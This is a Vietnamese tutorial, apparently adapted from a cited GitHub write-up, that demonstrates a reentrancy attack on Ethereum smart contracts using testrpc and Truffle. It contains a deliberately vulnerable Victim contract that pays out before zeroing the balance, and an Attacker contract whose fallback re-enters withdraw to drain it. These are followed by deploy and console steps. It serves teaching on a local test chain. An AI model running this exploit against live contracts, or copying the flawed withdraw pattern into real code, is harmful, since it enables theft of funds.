referent: https://github.com/Oakland-Blockchain-Developers/Reentrancy-Attack-On-Smart-Contract/blob/master/reentrancy-attack-101.md
			https://erc20token.sonnguyen.ws/en/latest/
			http://securitybox.vn/3423/lo-hong-trong-ung-dung-hop-dong-thong-minh/
Buoc 1: chạy mạng riêng với tham số -u 0 nghĩa là sẽ chạy lên tài khoảng số 0
	$ testrpc -u 0
Buoc 2: cài truffle
	...
Buoc 3: 
	$ mkdir reentrancy
	$ cd reentrancy
	$ truffle init
	$ rm -rf test/ contracts/ConvertLib.sol contracts/MetaCoin.sol
	$ touch contracts/Attacker.sol contracts/Victim.sol

bên trong contracts/Victim.sol ta ghi:

	pragma solidity ^0.4.15;
	contract Victim {
	  uint withdrawableBalance = 2 ether;
	  
	  function withdraw() {
		if (!msg.sender.call.value(withdrawableBalance)()){
		  throw;
		}
		withdrawableBalance = 0;
	  }
	  function deposit() payable {
		withdrawableBalance = msg.value;
	  }
	}

bên trong contracts/Attacker.sol ghi:

	pragma solidity ^0.4.15;
	import './Victim.sol';
	contract Attacker {
	  Victim victim;

	  function Attacker(address victimAddress) {
		victim = Victim(victimAddress);
	  }
	  function attack() {
		victim.withdraw();
	  }
	  // Fallback function which is called whenever Attacker receives ether
	  function () payable {
		if (victim.balance >= msg.value) {
		  victim.withdraw();
		}
	  }
	}

bên trong  `migrations/2_deploy_contracts.js``` ghi:

	const Victim = artifacts.require('./Victim.sol')
	const Attacker = artifacts.require('./Attacker.sol')
	module.exports = function(deployer) {
	  deployer
		.deploy(Victim)
		.then(() =>
		  deployer.deploy(Attacker, Victim.address)
		)
	}
	
Bước 4. Compile & Deploy Contract:

	$ truffle compile
	$ truffle deploy --reset

Bước 5: mở truffle/node console and deposit eth cho Victim contract instance.

	$ truffle console
	truffle(development)> acct1 = web3.eth.accounts[0]

	truffle(development)> victim = Victim.deployed()
	
	truffle(development)> victim.then(contract => victimAddress = contract.address)
	 					  victim.then(contract => contract.deposit.sendTransaction({from: acct1, to: victimAddress, value: web3.toWei(10, 'ether')}))
	 
	truffle(development)> getBalance = web3.eth.getBalance

	truffle(development)> web3.fromWei(getBalance(acct1).toString())

	truffle(development)> web3.fromWei(getBalance(victimAddress).toString())

	truffle(development)> web3.fromWei(getBalance(acct1).toString())

	truffle(development)> web3.fromWei(getBalance(victimAddress).toString())

Bước 6. tấn công
	attacker = Attacker.deployed()
	attacker.then(contract => attackerAddress = contract.address)
	truffle(development)> web3.fromWei(getBalance(attackerAddress).toString())

	attacker.then(contract => contract.attack())
	
	truffle(development)> web3.fromWei(getBalance(attackerAddress).toString())

	truffle(development)> web3.fromWei(getBalance(victimAddress).toString())
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	

